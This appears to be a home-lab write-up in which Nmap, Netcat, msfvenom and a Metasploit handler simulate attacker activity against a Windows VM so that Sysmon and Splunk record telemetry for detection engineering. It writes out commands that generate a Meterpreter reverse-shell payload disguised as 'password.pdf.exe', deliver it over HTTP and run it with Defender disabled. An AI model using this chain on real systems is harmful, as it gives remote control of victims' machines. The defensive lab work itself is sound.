# 🔴 Part 3: Attack Simulation

This phase simulates **realistic attacker behavior** in a controlled lab environment to generate endpoint telemetry for detection engineering and SIEM analysis.

The objective of this phase is **not successful exploitation**, but rather:
- To trigger attacker-like activity
- To observe endpoint security behavior
- To generate Sysmon and Windows Event telemetry
- To validate downstream log ingestion and parsing in Splunk

All activity was conducted intentionally and transparently for defensive learning purposes.

---

## 🎯 Objectives

- Simulate early-stage attacker behavior from Kali Linux
- Generate observable endpoint activity on Windows
- Produce process, network, and execution telemetry
- Validate that security controls generate logs, even when attacks fail or are blocked

---

## 🛠️ Techniques Simulated

The following attacker techniques were intentionally exercised:

| Technique | Purpose |
|--------|--------|
| Network scanning (Nmap) | Host discovery and reconnaissance |
| TCP connectivity testing (Netcat) | Service reachability validation |
| Payload generation (msfvenom) | Malware-like artifact creation |
| Payload delivery (HTTP) | File transfer telemetry |
| Payload execution | Process creation and network activity |

These techniques were selected to **generate detection-relevant telemetry**, not to evade defenses.

---

## 🔍 Network Reconnaissance with Nmap

Initial reconnaissance was performed from the Kali Linux attacker VM against the Windows endpoint.

```bash
nmap -A 192.168.20.10
```
## Expected Attacker Behavior

- Port scanning

- OS fingerprinting

- NSE script execution

- Traceroute attempts

## ❌ Issue 1: Nmap Reports All Ports as Filtered
## Symptom

- No open ports detected

- OS detection failed

- NSE scripts did not return results

## Diagnosis

- Verified IP addressing and routing

- Confirmed host reachability via targeted connectivity tests

- Identified Windows Defender Firewall silently dropping scan traffic

## Root Cause

With Windows Firewall enabled:

- ICMP echo requests were blocked

- TCP SYN probes were dropped

- Aggressive scan behavior (-A) was restricted

## Fix

- Temporarily allowed specific inbound ports for testing

- Validated scan behavior

- Re-enabled firewall to preserve a realistic endpoint security posture

## Lesson Learned

A fully patched endpoint with a firewall enabled may appear completely invisible to network scanners, while still generating valuable internal telemetry.

## 🔌 TCP Connectivity Validation with Netcat

To validate basic network communication independent of Nmap scan behavior, Netcat was used.
```bash
nc 192.168.20.10 8050
```
## Outcome

- Successful TCP connection established

- Confirmed network path and routing were functional

- Demonstrated that firewall rules were port-specific

## Lesson Learned

Successful Netcat connectivity does not imply that reconnaissance tools like Nmap will produce meaningful results.

## 🧪 Payload Generation with msfvenom

To simulate malware delivery and execution, a Windows payload was generated on the Kali attacker VM.

Payloads were created strictly for lab and learning purposes.
```bash
msfvenom -l payloads
```

A Meterpreter reverse TCP payload was selected and generated:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o password.pdf.exe
```
## Objective

- Create a realistic Windows executable

- Generate process creation telemetry

- Trigger outbound network connection attempts

## 🧨 Payload Execution and Handler Setup

A Metasploit handler was configured on the Kali VM to receive the reverse connection.
```bash
msfconsole
```

Within Metasploit:
typed options <- to see what can be configured
noticed the payload is set to a generic payload
used
```bash
set payload windows/x64/meterpreter/reverse_tcp
```
next the lhost had to be set to the Kali VM
```bash
set lhost 192.168.20.11
```
The handler was started 
```bash
execute
```
On the Windows endpoint, the payload was executed manually:
```powerpoint
.\password.pdf.exe
```
## Security Control Behavior

- Windows Defender was manually disabled to allow execution

- This was done intentionally to observe full execution telemetry

- The focus remained on detection signal generation, not evasion

## 📦 Payload Delivery over HTTP

The payload was hosted using a simple Python HTTP server on Kali.
```bash
python3 -m http.server 8080
```

The payload was retrieved from the Windows VM using PowerShell:
```powershell
Invoke-WebRequest http://192.168.20.11:8080/password.pdf.exe -OutFile password.pdf.exe
```
## Telemetry Generated

- Network connection from Windows to Kali

- File write activity

- HTTP download artifacts

On the Windows endpoint, the payload was executed manually:
```powershell
.\password.pdf.exe
```
## Security Control Behavior

- Windows Defender was manually disabled to allow execution

- This was done intentionally to observe full execution telemetry

- The focus remained on detection signal generation, not evasion

## 📡 Telemetry Observed

- The attack simulation generated the following types of endpoint telemetry:

- Process creation events

- Parent-child process relationships

- Command-line execution details

- Outbound network connection attempts

- Firewall and execution context signals

This data was collected by:

- Sysmon (using a non-default GitHub-sourced configuration)

- Windows Event Logging

- Splunk Enterprise (installed locally on the Windows VM)

No noticeable ingestion delays or timestamp skew were observed.

## ✅ Outcome

- Attacker behavior was successfully simulated

- Windows endpoint generated meaningful security telemetry

- Defensive controls behaved as expected

- Logs were available for downstream parsing and analysis

- The lab environment was validated for detection engineering work

## 🧠 Lessons Learned

- Network invisibility does not equal lack of activity

- Blocked or failed attacks still generate valuable detection signals 
- Endpoint telemetry is often more reliable than network exposure
- Defensive tooling must be validated through real attacker behavior
- Accurate documentation matters as much as successful execution
